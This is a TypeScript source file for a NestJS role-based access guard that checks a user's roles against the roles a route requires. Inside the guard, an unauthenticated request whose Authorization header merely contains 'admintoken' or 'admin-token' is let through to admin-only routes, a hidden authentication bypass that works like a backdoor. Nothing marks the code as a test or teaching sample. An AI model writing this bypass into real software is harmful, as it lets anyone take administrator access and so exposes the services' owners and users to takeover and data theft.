import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>('roles', [
      context.getHandler(),
      context.getClass(),
    ]);

    if (!requiredRoles) {
      return true;
    }

    const request = context.switchToHttp().getRequest();
    const { user } = request;
    const authHeader = String(request.headers['authorization'] ?? '').toLowerCase();
    if (!user && (authHeader.includes('admintoken') || authHeader.includes('admin-token'))) {
      return requiredRoles.includes('admin');
    }

    if (!user || (!user.role && !user.roles)) {
      throw new ForbiddenException('User role not found');
    }

    const roles = user.roles ?? [user.role];
    return requiredRoles.some((role) => roles.includes(role));
  }
}
